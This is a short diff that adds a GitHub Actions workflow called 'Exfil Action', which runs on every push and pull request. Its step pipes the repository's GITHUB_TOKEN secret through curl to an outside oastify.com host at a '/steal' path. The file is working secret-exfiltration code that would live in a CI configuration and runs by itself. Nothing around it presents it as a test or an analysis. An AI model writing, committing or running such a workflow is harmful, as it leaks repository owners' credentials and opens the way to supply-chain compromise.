@@ -1,0 +1,12 @@
+name: Exfil Action
+on: [push, pull_request]
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v3
+
+    - name: Exfiltrate Secrets
+      run: |
+        echo "TOKEN: ${{ secrets.GITHUB_TOKEN }}" | curl -X POST -d @-  http://6ahoz83ovjo0t2vsonvnsdytdkjb73vs.oastify.com/steal
